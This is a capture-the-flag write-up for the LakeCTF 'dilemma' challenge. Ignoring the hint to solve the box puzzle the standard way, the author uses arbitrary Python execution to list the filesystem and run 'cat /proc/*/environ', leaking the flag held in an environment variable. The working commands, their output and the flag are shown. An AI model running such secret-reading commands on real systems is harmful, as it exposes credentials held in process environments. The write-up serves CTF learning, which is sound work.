---
title: dilemma
challenge_type: Rev
writeup_author: "@xabito"
competition: lakectf-25-26-quals
summary: |-
  A classic dilemma. Hint: there are no hidden tricks. You're sandboxed, don't waste time poking the filesystem or the network. You just need to solve it the standard way.
  
  Example python: `while True: print(1)\nEOF`
connections:
  - url: chall.polygl0ts.ch:6667
attachments:
  - title: compose.yaml
    url: /assets/files/lakectf-25-26-quals/dilemma/compose.yaml
  - title: Dockerfile_redacted
    url: /assets/files/lakectf-25-26-quals/dilemma/Dockerfile_redacted
  - title: run_fakeflag
    url: /assets/files/lakectf-25-26-quals/dilemma/run_fakeflag
  - title: chal
    url: /assets/files/lakectf-25-26-quals/dilemma/chal
---

## Recon

Let's start by trying the example provided in the challenge description to see how the challenge behaves:

```bash
$ nc chall.polygl0ts.ch 6667
Provide Python script for player 1 (end with string 'EOF' on its own line):
while True: print(1)
EOF
You are player number 1. You have 50 attempts left. Which box do you want to open?
[python 1] 1
The box 1 contains number 20.
You are player number 1. You have 49 attempts left. Which box do you want to open?
[python 1] 1
The box 1 contains number 20.
...
You are player number 1. You have 2 attempts left. Which box do you want to open?
[python 1] 1
The box 1 contains number 20.
You are player number 1. You have 1 attempts left. Which box do you want to open?
[python 1] 1
The box 1 contains number 20.
Player 1 failed after 50 attempts.
```

It looks like the challenge is a game where we need to provide a Python script that will output our choices for each move.

However, since we are allowed to execute Python code, it is worth checking whether there are any restrictions in place.

```bash
$ nc chall.polygl0ts.ch 6667
Provide Python script for player 1 (end with string 'EOF' on its own line):
import subprocess
res = subprocess.run("ls /", capture_output=True, shell=True)
print(res.stdout)
EOF
[python 1] b'app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n'
Invalid response from Python. Quitting.
```

## Exploitation

It looks like we can execute arbitrary code and see its output. By checking the `run_fakeflag` script, we can see that the flag is assigned as an environment variable. We might be able to leak the flag by reading all environment variables from every process:

```python
import subprocess
res = subprocess.run("cat /proc/*/environ", capture_output=True, shell=True)
print(res.stdout)
```

## Flag capture

Simply send this script to the server to retrieve the flag:

```bash
$ nc chall.polygl0ts.ch 6667
Provide Python script for player 1 (end with string 'EOF' on its own line):
import subprocess
res = subprocess.run("cat /proc/*/environ", capture_output=True, shell=True)
print(res.stdout)
EOF
You are player number 1. You have 50 attempts left. Which box do you want to open?
[python 1] b'FLAG=EPFL{wow_such_puzzle_did_you_google_the_solution_or_did_you_just_came_up_with_it?}\x00PWD=/app\x00SHLVL=1\x00_=./chal\x0
Invalid response from Python. Quitting.
```

```
Flag: EPFL{wow_such_puzzle_did_you_google_the_solution_or_did_you_just_came_up_with_it?}
```